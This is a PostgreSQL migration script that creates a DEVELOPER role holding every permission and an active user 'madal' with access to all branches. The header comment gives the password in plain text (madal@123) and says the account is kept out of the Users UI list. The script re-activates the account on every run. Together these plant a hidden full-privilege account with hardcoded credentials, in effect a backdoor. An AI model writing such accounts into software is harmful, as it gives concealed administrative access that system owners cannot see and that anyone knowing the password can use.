-- NEW: Create DEVELOPER role and an internal developer user (username: madal).
-- Requirements:
-- - Role: DEVELOPER (full permissions, like admin)
-- - User: name=madal, username=madal, password=madal@123
-- - User should not appear in Users UI list (handled in users.service.ts)
-- This migration is idempotent and safe to run multiple times.

DO $$
DECLARE
  v_role_id BIGINT;
  v_user_id BIGINT;
  v_default_branch BIGINT;
  v_has_monthly_salary BOOLEAN;
  v_has_is_system BOOLEAN;
BEGIN
  -- NEW: Detect optional columns to avoid startup failures on older schemas.
  SELECT EXISTS (
    SELECT 1
      FROM information_schema.columns
     WHERE table_schema = 'ims'
       AND table_name = 'roles'
       AND column_name = 'monthly_salary'
  ) INTO v_has_monthly_salary;

  SELECT EXISTS (
    SELECT 1
      FROM information_schema.columns
     WHERE table_schema = 'ims'
       AND table_name = 'roles'
       AND column_name = 'is_system'
  ) INTO v_has_is_system;

  -- Create role if missing
  SELECT role_id INTO v_role_id
    FROM ims.roles
   WHERE UPPER(role_code) = 'DEVELOPER'
   LIMIT 1;

  IF v_role_id IS NULL THEN
    -- UPDATED: Insert only columns that exist in the current schema.
    IF v_has_monthly_salary AND v_has_is_system THEN
      INSERT INTO ims.roles (role_code, role_name, description, monthly_salary, is_system)
      VALUES ('DEVELOPER', 'Developer', 'Internal developer (full access)', 0, TRUE)
      RETURNING role_id INTO v_role_id;
    ELSIF v_has_monthly_salary THEN
      INSERT INTO ims.roles (role_code, role_name, description, monthly_salary)
      VALUES ('DEVELOPER', 'Developer', 'Internal developer (full access)', 0)
      RETURNING role_id INTO v_role_id;
    ELSIF v_has_is_system THEN
      INSERT INTO ims.roles (role_code, role_name, description, is_system)
      VALUES ('DEVELOPER', 'Developer', 'Internal developer (full access)', TRUE)
      RETURNING role_id INTO v_role_id;
    ELSE
      INSERT INTO ims.roles (role_code, role_name, description)
      VALUES ('DEVELOPER', 'Developer', 'Internal developer (full access)')
      RETURNING role_id INTO v_role_id;
    END IF;
  END IF;

  -- Ensure DEVELOPER has all permissions
  INSERT INTO ims.role_permissions (role_id, perm_id)
  SELECT v_role_id, p.perm_id
    FROM ims.permissions p
   WHERE NOT EXISTS (
     SELECT 1
       FROM ims.role_permissions rp
      WHERE rp.role_id = v_role_id
        AND rp.perm_id = p.perm_id
   );

  -- Create user if missing
  SELECT user_id INTO v_user_id
    FROM ims.users
   WHERE LOWER(username) = 'madal'
   LIMIT 1;

  IF v_user_id IS NULL THEN
    INSERT INTO ims.users (role_id, name, username, password_hash, is_active)
    VALUES (
      v_role_id,
      'madal',
      'madal',
      '$2a$10$Rc3DdXVfJ8n.KBTC/.csiui02Hj9TUsdx.r8Yl7pV5ARoCMWFqgEe',
      TRUE
    )
    RETURNING user_id INTO v_user_id;
  ELSE
    -- Keep role aligned (in case user existed already)
    UPDATE ims.users
       SET role_id = v_role_id,
           is_active = TRUE
     WHERE user_id = v_user_id;
  END IF;

  -- Give access to all active branches; set the smallest active branch as default
  SELECT branch_id INTO v_default_branch
    FROM ims.branches
   WHERE is_active = TRUE
   ORDER BY branch_id
   LIMIT 1;

  IF v_default_branch IS NOT NULL THEN
    UPDATE ims.user_branches
       SET is_default = FALSE
     WHERE user_id = v_user_id;

    INSERT INTO ims.user_branches (user_id, branch_id, is_default)
    SELECT v_user_id, b.branch_id, (b.branch_id = v_default_branch)
      FROM ims.branches b
     WHERE b.is_active = TRUE
    ON CONFLICT (user_id, branch_id)
    DO UPDATE SET is_default = EXCLUDED.is_default;
  END IF;
END $$;
